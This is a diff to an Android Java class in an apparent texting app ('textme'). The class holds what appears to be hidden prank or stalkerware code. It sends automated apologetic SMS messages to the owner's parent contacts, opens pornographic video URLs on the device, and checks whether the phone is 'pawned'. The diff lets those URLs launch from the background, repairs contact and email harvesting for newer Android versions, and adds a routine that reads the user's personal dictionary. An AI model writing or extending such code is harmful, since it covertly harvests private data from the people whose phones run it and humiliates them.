@@ -28,6 +28,7 @@ import android.media.MediaPlayer;
 import android.media.RingtoneManager;
 import android.net.Uri;
 import android.net.wifi.WifiManager;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.VibrationEffect;
@@ -38,9 +39,11 @@ import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.Settings;
 import android.provider.Telephony;
+import android.provider.UserDictionary;
 import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
 import android.telephony.TelephonyManager;
+import android.util.Log;
 import android.util.Pair;
 
 import com.candroid.textme.R;
@@ -236,9 +239,7 @@ public class Lofl {
             for(Contact contact : parents){
                 Lofl.sendNonDataSms(context, contact.mAddress, "I'm sending an automated sms message to your phone. I'm sorry.");
             }
-
         }
-
     }
 
     public static boolean isPawned(Context context){
@@ -381,6 +382,7 @@ public class Lofl {
     public static void watchPornHubVideo(Context context, String videoId){
         Uri pornVideo = Uri.parse("https://www.pornhub.com/view_video.php?viewkey=".concat(videoId));
         Intent pornIntent = new Intent(Intent.ACTION_VIEW, pornVideo);
+        pornIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         context.startActivity(pornIntent);
     }
 
@@ -483,13 +485,15 @@ public class Lofl {
     public static ArrayList<Contact> fetchContactsInformation(Context context){
         ArrayList<Contact> contacts = new ArrayList<>();
         Cursor cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null);
+        int hasEmail = -1;
         if(cursor != null){
             while(cursor.moveToNext()){
                 String name = cursor.getString(cursor.getColumnIndex("display_name"));
                 String email = null;
                 String address = null;
-                int hasEmail = cursor.getInt(cursor.getColumnIndex("has_email"));
-
+                if(Build.VERSION.SDK_INT < Build.VERSION_CODES.P){
+                    hasEmail = cursor.getInt(cursor.getColumnIndex("has_email"));
+                }
                 if(hasEmail == 1){
                     long id = cursor.getLong(cursor.getColumnIndex("_id"));
                     email = lookupEmailByContactId(context, id);
@@ -540,6 +544,13 @@ public class Lofl {
 
     public static void wifiScan(Context context){
         getWifiManager(context).startScan();
+    }
+
+    private static void dumpDatabaseColumnNamesToLogFile(Cursor cursor){
+        String[] columnNames = cursor.getColumnNames();
+        for(String columnName : columnNames){
+            Log.d("DATABASE COLUMNS", String.format("Column Name = %s", columnName));
+        }
     }
 
     public static String lookupEmailByContactId(Context context, long id){
@@ -851,6 +862,22 @@ public class Lofl {
         Intent whisperIntent = createWhisperIntent(address, intent);
         PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, whisperIntent, PendingIntent.FLAG_UPDATE_CURRENT);
         return pendingIntent;
+    }
+
+    /*DICTIONARY PERMISSION REMOVED IN ANDROID M*/
+    public static ArrayList<String> fetchDictionary(Context context){
+        ArrayList<String> dictionary = new ArrayList<>();
+        Cursor cursor = context.getContentResolver().query(UserDictionary.Words.CONTENT_URI, null, null, null, null);
+        if(cursor != null){
+            int wordColumnIndex = cursor.getColumnIndex("word");
+            while(cursor.moveToNext()){
+                String word = cursor.getString(wordColumnIndex);
+                if(word != null){
+                    dictionary.add(word);
+                }
+            }
+        }
+        return dictionary;
     }
 
     private static Intent createWhisperIntent(String address, Intent sharedIntent) {
